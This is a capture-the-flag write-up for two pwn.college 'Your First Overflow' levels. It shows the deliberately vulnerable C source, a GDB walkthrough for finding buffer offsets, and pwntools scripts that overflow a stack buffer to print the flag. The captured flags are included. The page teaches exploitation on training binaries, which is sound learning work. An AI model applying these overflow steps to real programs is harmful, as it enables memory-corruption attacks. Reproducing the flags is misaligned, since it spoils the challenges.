---
custom_edit_url: null
sidebar_position: 6
---

## Your First Overflow (easy)

### Source code

```c title="/challenge/binary-exploitation-first-overflow-w.c" showLineNumbers
 #define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

uint64_t sp_;
uint64_t bp_;
uint64_t sz_;
uint64_t cp_;
uint64_t cv_;
uint64_t si_;
uint64_t rp_;

#define GET_SP(sp) asm volatile ("mov %0, rsp" : "=r"(sp) : : );
#define GET_BP(bp) asm volatile ("mov %0, rbp" : "=r"(bp) : : );
#define GET_CANARY(cn) asm volatile ("mov %0, QWORD PTR [fs:0x28]" : "=r"(cn) : : );
#define GET_FRAME_WORDS(sz_, sp, bp, rp_) GET_SP(sp); GET_BP(bp); sz_ = (bp-sp)/8+2; rp_ = bp+8;
#define FIND_CANARY(cnp, cv, start)                                     \
  {                                                                     \
    cnp = start;                                                        \
    GET_CANARY(cv);                                                     \
    while (*(uint64_t *)cnp != cv) cnp = (uint64_t)cnp - 8;   \
  }

void DUMP_STACK(uint64_t sp, uint64_t n)
{
    printf("+---------------------------------+-------------------------+--------------------+\n");
    printf("| %31s | %23s | %18s |\n", "Stack location", "Data (bytes)", "Data (LE int)");
    printf("+---------------------------------+-------------------------+--------------------+\n");
    for (si_ = 0; si_ < n; si_++)
    {
        printf("| 0x%016lx (rsp+0x%04x) | %02x %02x %02x %02x %02x %02x %02x %02x | 0x%016lx |\n",
               sp+8*si_, 8*si_,
               *(uint8_t *)(sp+8*si_+0), *(uint8_t *)(sp+8*si_+1), *(uint8_t *)(sp+8*si_+2), *(uint8_t *)(sp+8*si_+3),
               *(uint8_t *)(sp+8*si_+4), *(uint8_t *)(sp+8*si_+5), *(uint8_t *)(sp+8*si_+6), *(uint8_t *)(sp+8*si_+7),
               *(uint64_t *)(sp+8*si_)
              );
    }
    printf("+---------------------------------+-------------------------+--------------------+\n");
}

void bin_padding()
{
    asm volatile (".rept 3705; nop; .endr");
}

void win()
{
    static char flag[256];
    static int flag_fd;
    static int flag_length;

    puts("You win! Here is your flag:");
    flag_fd = open("/flag", 0);
    if (flag_fd < 0)
    {
        printf("\n  ERROR: Failed to open the flag -- %s!\n", strerror(errno));
        if (geteuid() != 0)
        {
            printf("  Your effective user id is not 0!\n");
            printf("  You must directly run the suid binary in order to have the correct permissions!\n");
        }
        exit(-1);
    }
    flag_length = read(flag_fd, flag, sizeof(flag));
    if (flag_length <= 0)
    {
        printf("\n  ERROR: Failed to read the flag -- %s!\n", strerror(errno));
        exit(-1);
    }
    write(1, flag, flag_length);
    printf("\n\n");
}

int challenge(int argc, char **argv, char **envp)
{
    struct
    {
        char input[56];
        int win_variable;
    } data  = {0} ;

    unsigned long size = 0;

    puts("The challenge() function has just been launched!");

    GET_FRAME_WORDS(sz_, sp_, bp_, rp_);
    puts("Before we do anything, let's take a look at challenge()'s stack frame:");
    DUMP_STACK(sp_, sz_);
    printf("Our stack pointer points to %p, and our base pointer points to %p.\n", sp_, bp_);
    printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
    printf("including the saved base pointer and the saved return address, for a\n");
    printf("total of %d bytes.\n", sz_ * 8);
    printf("The input buffer begins at %p, partway through the stack frame,\n", &data.input);
    printf("(\"above\" it in the stack are other local variables used by the function).\n");
    printf("Your input will be read into this buffer.\n");
    printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 56);
    printf("large input length, and thus overflow the buffer.\n\n");

    printf("In this level, there is a \"win\" variable.\n");
    printf("By default, the value of this variable is zero.\n");
    printf("However, when this variable is non-zero, the flag will be printed.\n");
    printf("You can make this variable be non-zero by overflowing the input buffer.\n");
    printf("The \"win\" variable is stored at %p, %d bytes after the start of your input buffer.\n\n", &data.win_variable, ((unsigned long) &data.win_variable) - ((unsigned long) &data.input));

    puts("We have disabled the following standard memory corruption mitigations for this challenge:");
    puts("- the binary is *not* position independent. This means that it will be");
    puts("located at the same spot every time it is run, which means that by");
    puts("analyzing the binary (using objdump or reading this output), you can");
    puts("know the exact value that you need to overwrite the return address with.\n");

    FIND_CANARY(cp_, cv_, bp_);

    size = 4096;

    printf("You have chosen to send %lu bytes of input!\n", size);
    printf("This will allow you to write from %p (the start of the input buffer)\n", &data.input);
    printf("right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n", size + (unsigned long) &data.input, size - 56);

    printf("Send your payload (up to %lu bytes)!\n", size);
    int received = read(0, &data.input, (unsigned long) size);

    if (received < 0)
    {
        printf("ERROR: Failed to read input -- %s!\n", strerror(errno));
        exit(1);
    }

    printf("You sent %d bytes!\n", received);

    printf("Let's see what happened with the stack:\n\n");
    DUMP_STACK(sp_, sz_);

    printf("The program's memory status:\n");
    printf("- the input buffer starts at %p\n", &data.input);
    printf("- the saved frame pointer (of main) is at %p\n", bp_);
    printf("- the saved return address (previously to main) is at %p\n", rp_);
    printf("- the saved return address is now pointing to %p.\n", *(unsigned long*)(rp_));
    printf("- the canary is stored at %p.\n", cp_);
    printf("- the canary value is now %p.\n", *(unsigned long*)(cp_));
    printf("- the address of the win variable is %p.\n", &data.win_variable);
    printf("- the value of the win variable is 0x%x.\n", data.win_variable);
    printf("\n");

    if (data.win_variable)
    {
        win();
    }

    puts("Goodbye!");

    return 0;
}

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    char crash_resistance[0x1000];

    challenge(argc, argv, envp);

}
```

On running the challenge, we get the following:

```
hacker@binary-exploitation~your-first-overflow-easy:/$ /challenge/binary-exploitation-first-overflow-w
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffd92a28580 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd92a28588 (rsp+0x0008) | 48 97 a2 92 fd 7f 00 00 | 0x00007ffd92a29748 |
| 0x00007ffd92a28590 (rsp+0x0010) | 38 97 a2 92 fd 7f 00 00 | 0x00007ffd92a29738 |
| 0x00007ffd92a28598 (rsp+0x0018) | 25 a5 b4 bf 01 00 00 00 | 0x00000001bfb4a525 |
| 0x00007ffd92a285a0 (rsp+0x0020) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |
| 0x00007ffd92a285a8 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd92a285b0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd92a285b8 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd92a285c0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd92a285c8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd92a285d0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd92a285d8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd92a285e0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd92a285e8 (rsp+0x0068) | 00 00 00 00 fd 7f 00 00 | 0x00007ffd00000000 |
| 0x00007ffd92a285f0 (rsp+0x0070) | b0 11 40 00 00 00 00 00 | 0x00000000004011b0 |
| 0x00007ffd92a285f8 (rsp+0x0078) | 00 13 c2 3e ea 86 82 2f | 0x2f8286ea3ec21300 |
| 0x00007ffd92a28600 (rsp+0x0080) | 40 96 a2 92 fd 7f 00 00 | 0x00007ffd92a29640 |
| 0x00007ffd92a28608 (rsp+0x0088) | 50 29 40 00 00 00 00 00 | 0x0000000000402950 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffd92a28580, and our base pointer points to 0x7ffd92a28600.
This means that we have (decimal) 18 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 144 bytes.
The input buffer begins at 0x7ffd92a285b0, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 56 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is a "win" variable.
By default, the value of this variable is zero.
However, when this variable is non-zero, the flag will be printed.
You can make this variable be non-zero by overflowing the input buffer.
The "win" variable is stored at 0x7ffd92a285e8, 56 bytes after the start of your input buffer.

We have disabled the following standard memory corruption mitigations for this challenge:
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

You have chosen to send 4096 bytes of input!
This will allow you to write from 0x7ffd92a285b0 (the start of the input buffer)
right up to (but not including) 0x7ffd92a295b0 (which is 4040 bytes beyond the end of the buffer).
Send your payload (up to 4096 bytes)!
```

We simply have to send 56 bytes of padding to fill out the buffer, and then we can overwrite the `win` variable, and get the flag.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

padding = b'A' * 56
payload = padding + p64(0x42424242)

p = process('/challenge/binary-exploitation-first-overflow-w')
p.recvuntil('bytes)!')
p.send(payload)
output = p.recvall(timeout=2) 
print(output.decode(errors='ignore'))
p.close()
```

```
hacker@binary-exploitation~your-first-overflow-easy:/$ python ~/script.py 
[+] Starting local process '/challenge/binary-exploitation-first-overflow-w': pid 5718
/home/hacker/script.py:7: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil('bytes)!')
[â–] Receiving all data: 1B
[+] Receiving all data: Done (2.37KB)tation-first-overflow-w' stopped with exit code 0 (pi
d 5718)

You sent 64 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffe3f82d510 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3f82d518 (rsp+0x0008) | d8 e6 82 3f fe 7f 00 00 | 0x00007ffe3f82e6d8 |
| 0x00007ffe3f82d520 (rsp+0x0010) | c8 e6 82 3f fe 7f 00 00 | 0x00007ffe3f82e6c8 |
| 0x00007ffe3f82d528 (rsp+0x0018) | 25 45 a4 67 01 00 00 00 | 0x0000000167a44525 |
| 0x00007ffe3f82d530 (rsp+0x0020) | 00 10 00 00 40 00 00 00 | 0x0000004000001000 |
| 0x00007ffe3f82d538 (rsp+0x0028) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |
| 0x00007ffe3f82d540 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe3f82d548 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe3f82d550 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe3f82d558 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe3f82d560 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe3f82d568 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe3f82d570 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe3f82d578 (rsp+0x0068) | 42 42 42 42 00 00 00 00 | 0x0000000042424242 |
| 0x00007ffe3f82d580 (rsp+0x0070) | b0 11 40 00 00 00 00 00 | 0x00000000004011b0 |
| 0x00007ffe3f82d588 (rsp+0x0078) | 00 0a d0 55 5a 93 06 6d | 0x6d06935a55d00a00 |
| 0x00007ffe3f82d590 (rsp+0x0080) | d0 e5 82 3f fe 7f 00 00 | 0x00007ffe3f82e5d0 |
| 0x00007ffe3f82d598 (rsp+0x0088) | 50 29 40 00 00 00 00 00 | 0x0000000000402950 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffe3f82d540
- the saved frame pointer (of main) is at 0x7ffe3f82d590
- the saved return address (previously to main) is at 0x7ffe3f82d598
- the saved return address is now pointing to 0x402950.
- the canary is stored at 0x7ffe3f82d588.
- the canary value is now 0x6d06935a55d00a00.
- the address of the win variable is 0x7ffe3f82d578.
- the value of the win variable is 0x42424242.

You win! Here is your flag:
pwn.college{IklKJD4tmAGF8uR7XZbFtXjDVI1.0VO4IDL4ITM0EzW}


Goodbye!
```

&nbsp;

## Your First Overflow (hard)

### Source code

```py title="/challenge/binary-exploitation-first-overflow.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

void bin_padding()
{
    asm volatile (".rept 2295; nop; .endr");
}

void win()
{
    static char flag[256];
    static int flag_fd;
    static int flag_length;

    puts("You win! Here is your flag:");
    flag_fd = open("/flag", 0);
    if (flag_fd < 0)
    {
        printf("\n  ERROR: Failed to open the flag -- %s!\n", strerror(errno));
        if (geteuid() != 0)
        {
            printf("  Your effective user id is not 0!\n");
            printf("  You must directly run the suid binary in order to have the correct permissions!\n");
        }
        exit(-1);
    }
    flag_length = read(flag_fd, flag, sizeof(flag));
    if (flag_length <= 0)
    {
        printf("\n  ERROR: Failed to read the flag -- %s!\n", strerror(errno));
        exit(-1);
    }
    write(1, flag, flag_length);
    printf("\n\n");
}

int challenge(int argc, char **argv, char **envp)
{
    struct
    {
        char input[91];
        int win_variable;
    } data  = {0} ;

    unsigned long size = 0;

    size = 4096;

    printf("Send your payload (up to %lu bytes)!\n", size);
    int received = read(0, &data.input, (unsigned long) size);

    if (received < 0)
    {
        printf("ERROR: Failed to read input -- %s!\n", strerror(errno));
        exit(1);
    }

    if (data.win_variable)
    {
        win();
    }

    puts("Goodbye!");

    return 0;
}

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    char crash_resistance[0x1000];

    challenge(argc, argv, envp);

}
```

Let's first check the file type.

```
hacker@binary-exploitation~your-first-overflow-hard:/$ file /challenge/binary-exploitation-first-overflow
/challenge/binary-exploitation-first-overflow: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0820f5d1594512f9ce64b72709778e6500a2c4f4, for GNU/Linux 3.2.0, not stripped
```

So the challenge is a 64-bit LSB executable, let's run it.

```
hacker@binary-exploitation~your-first-overflow-hard:/$ /challenge/binary-exploitation-first-overflow
Send your payload (up to 4096 bytes)!
```

This time we are not given any information by the program. There are certain values we need to know in order to perform a buffer overflow.
* [ ] Location of the buffer to be overflowed
* [ ] Location of the data to be overwritten 

Let's open the program within GDB and try to find this information.

```
hacker@binary-exploitation~your-first-overflow-hard:/home$ gdb /challenge/binary-exploitation-first-overflow
GNU gdb (GDB) 16.2
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-unknown-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /challenge/binary-exploitation-first-overflow...
(No debugging symbols found in /challenge/binary-exploitation-first-overflow)
(gdb) 
```

We need to see which functions are present in the binary.

```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010e0  __errno_location@plt
0x00000000004010f0  puts@plt
0x0000000000401100  write@plt
0x0000000000401110  __stack_chk_fail@plt
0x0000000000401120  printf@plt
0x0000000000401130  geteuid@plt
0x0000000000401140  read@plt
0x0000000000401150  setvbuf@plt
0x0000000000401160  open@plt
0x0000000000401170  exit@plt
0x0000000000401180  strerror@plt
0x0000000000401190  _start
0x00000000004011c0  _dl_relocate_static_pie
0x00000000004011d0  deregister_tm_clones
0x0000000000401200  register_tm_clones
0x0000000000401240  __do_global_dtors_aux
0x0000000000401270  frame_dummy
0x0000000000401276  bin_padding
0x0000000000401b78  win
0x0000000000401c7f  challenge
0x0000000000401d6f  main
0x0000000000401e20  __libc_csu_init
0x0000000000401e90  __libc_csu_fini
0x0000000000401e98  _fini
```

The `challenge` funtion seems interesting, before we disassemble it, let's set the `disassembly-flavor` to `intel`.

```
(gdb) set disassembly-flavor intel
```

```
(gdb) disassemble challenge
Dump of assembler code for function challenge:
   0x0000000000401c7f <+0>:     endbr64
   0x0000000000401c83 <+4>:     push   rbp
   0x0000000000401c84 <+5>:     mov    rbp,rsp
   0x0000000000401c87 <+8>:     sub    rsp,0xa0
   0x0000000000401c8e <+15>:    mov    DWORD PTR [rbp-0x84],edi
   0x0000000000401c94 <+21>:    mov    QWORD PTR [rbp-0x90],rsi
   0x0000000000401c9b <+28>:    mov    QWORD PTR [rbp-0x98],rdx
   0x0000000000401ca2 <+35>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000401cab <+44>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401caf <+48>:    xor    eax,eax
   0x0000000000401cb1 <+50>:    lea    rdx,[rbp-0x70]
   0x0000000000401cb5 <+54>:    mov    eax,0x0
   0x0000000000401cba <+59>:    mov    ecx,0xc
   0x0000000000401cbf <+64>:    mov    rdi,rdx
   0x0000000000401cc2 <+67>:    rep stos QWORD PTR es:[rdi],rax
   0x0000000000401cc5 <+70>:    mov    QWORD PTR [rbp-0x78],0x0
   0x0000000000401ccd <+78>:    mov    QWORD PTR [rbp-0x78],0x1000
   0x0000000000401cd5 <+86>:    mov    rax,QWORD PTR [rbp-0x78]
   0x0000000000401cd9 <+90>:    mov    rsi,rax
   0x0000000000401cdc <+93>:    lea    rdi,[rip+0x42d]        # 0x402110
   0x0000000000401ce3 <+100>:   mov    eax,0x0
   0x0000000000401ce8 <+105>:   call   0x401120 <printf@plt>
   0x0000000000401ced <+110>:   mov    rdx,QWORD PTR [rbp-0x78]
   0x0000000000401cf1 <+114>:   lea    rax,[rbp-0x70]
   0x0000000000401cf5 <+118>:   mov    rsi,rax
   0x0000000000401cf8 <+121>:   mov    edi,0x0
   0x0000000000401cfd <+126>:   call   0x401140 <read@plt>
   0x0000000000401d02 <+131>:   mov    DWORD PTR [rbp-0x7c],eax
   0x0000000000401d05 <+134>:   cmp    DWORD PTR [rbp-0x7c],0x0
   0x0000000000401d09 <+138>:   jns    0x401d37 <challenge+184>
   0x0000000000401d0b <+140>:   call   0x4010e0 <__errno_location@plt>
   0x0000000000401d10 <+145>:   mov    eax,DWORD PTR [rax]
   0x0000000000401d12 <+147>:   mov    edi,eax
   0x0000000000401d14 <+149>:   call   0x401180 <strerror@plt>
   0x0000000000401d19 <+154>:   mov    rsi,rax
   0x0000000000401d1c <+157>:   lea    rdi,[rip+0x415]        # 0x402138
   0x0000000000401d23 <+164>:   mov    eax,0x0
   0x0000000000401d28 <+169>:   call   0x401120 <printf@plt>
   0x0000000000401d2d <+174>:   mov    edi,0x1
   0x0000000000401d32 <+179>:   call   0x401170 <exit@plt>
   0x0000000000401d37 <+184>:   mov    eax,DWORD PTR [rbp-0x14]
   0x0000000000401d3a <+187>:   test   eax,eax
   0x0000000000401d3c <+189>:   je     0x401d48 <challenge+201>
   0x0000000000401d3e <+191>:   mov    eax,0x0
   0x0000000000401d43 <+196>:   call   0x401b78 <win>
   0x0000000000401d48 <+201>:   lea    rdi,[rip+0x40d]        # 0x40215c
   0x0000000000401d4f <+208>:   call   0x4010f0 <puts@plt>
   0x0000000000401d54 <+213>:   mov    eax,0x0
   0x0000000000401d59 <+218>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x0000000000401d5d <+222>:   xor    rcx,QWORD PTR fs:0x28
   0x0000000000401d66 <+231>:   je     0x401d6d <challenge+238>
   0x0000000000401d68 <+233>:   call   0x401110 <__stack_chk_fail@plt>
   0x0000000000401d6d <+238>:   leave
   0x0000000000401d6e <+239>:   ret
End of assembler dump.
```

In this output, we can see that the program is making a `read@plt` call, this is to read in the user input.

```
# --- snip ---

   0x0000000000401ced <+110>:   mov    rdx,QWORD PTR [rbp-0x78]
   0x0000000000401cf1 <+114>:   lea    rax,[rbp-0x70]
   0x0000000000401cf5 <+118>:   mov    rsi,rax
   0x0000000000401cf8 <+121>:   mov    edi,0x0
   0x0000000000401cfd <+126>:   call   0x401140 <read@plt>

# --- snip ---
```

### `read@plt`

```c
ssize_t read(int fd, void buf[.count], size_t count);
```

| %rax | arg0 (%rdi) | arg1 (%rsi) | arg2 (%rdx) | 
| - | - | - | - |
| 0x00 | unsigned int fd | char *buf | size_t count |

We can see that the second argument is the location of the buffer in which the data is to be read. This argument is loaded in the `rsi` register.

Let's look at how this is loaded in our assembly code.

One thing to note is that the program is calling `read` function in the C standard library (`glibc`) through the Procedure Linkage Table (PLT). This internally sets up the syscall with `rax=0` and executes the `syscall` instruction. 
Hence, the `rax` register does not have to be  explicitely set to 0 in the program.

Let's set a breakpoint and check tehe value of `rsi` right before `read@plt` is called.

```
(gdb) break *(challenge+126)
Breakpoint 1 at 0x401cfd
```

Once the program execution hits our breakpoint, we can check the value of `rsi`.

```
(gdb) p/x $rsi
$1 = 0x7ffc5e80eb90
```

This tells us that the buffer is located at `0x7ffc5e80eb90`.

Within the `challenge` funtion, there is anoter interesting code snippet.

```
# --- snip ---

   0x0000000000401d37 <+184>:   mov    eax,DWORD PTR [rbp-0x14]
   0x0000000000401d3a <+187>:   test   eax,eax
   0x0000000000401d3c <+189>:   je     0x401d48 <challenge+201>
   0x0000000000401d3e <+191>:   mov    eax,0x0
   0x0000000000401d43 <+196>:   call   0x401b78 <win>
   0x0000000000401d48 <+201>:   lea    rdi,[rip+0x40d]        # 0x40215c

# --- snip ---
```

The program moves the data pointed to by `rbp-0x14` into `eax`, and then checks if it is `0`. If the check succeeds, it jumps to `challenge+201`, efectively skipping the `win` function.

Let'e set a breakpoint at `challenge+184` and validate what value is being pointed to by `rbp-0x14` (If our hypothesis is correct, it should be zero).

```
(gdb) break *(challenge+184)
Breakpoint 2 at 0x401d37
```

Let's continue the flow of execution, and provide some user input.

```
(gdb) c
Continuing.
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Breakpoint 2, 0x0000000000401d37 in challenge ()
```

Now, we can check the data in `rbp-0x14` and what it points to.

```
(gdb) x/dw $rbp-0x14
0x7ffc5e80ebec: 0
```

If we overwrite the data stored at `rbp-0x14` to something other that `0`, the program will not jump over `win` and we will get the flag.

We have satisfied all the requirements for a buffer overflow.

* [x] Location of the buffer to be overflowed: `0x7ffc5e80eb90`
* [x] Location of the data to be overwritten: `0x7ffc5e80ebec`

Now that we have the necessary data, we can calculate the distance between the buffer and the address to be overwritten.

```
(gdb) p/d 0x7ffc5e80ebec - 0x7ffc5e80eb90
$2 = 92
```

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

padding = b'A' * 92
payload = padding + p64(0x42424242)

p = process('/challenge/binary-exploitation-first-overflow')
p.recvuntil('bytes)!')
p.send(payload)
output = p.recvall(timeout=2) 
print(output.decode(errors='ignore'))
p.close()
```

```
hacker@binary-exploitation~your-first-overflow-hard:/$ python ~/script.py 
[+] Starting local process '/challenge/binary-exploitation-first-overflow': pid 30430
/home/hacker/script.py:7: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil('bytes)!')
[+] Receiving all data: Done (97B)
[*] Process '/challenge/binary-exploitation-first-overflow' stopped with exit code 0 (pid 30430)

You win! Here is your flag:
pwn.college{g40ivIGbon98_O-LlQdx5bT0UGF.0FM5IDL4ITM0EzW}


Goodbye!
```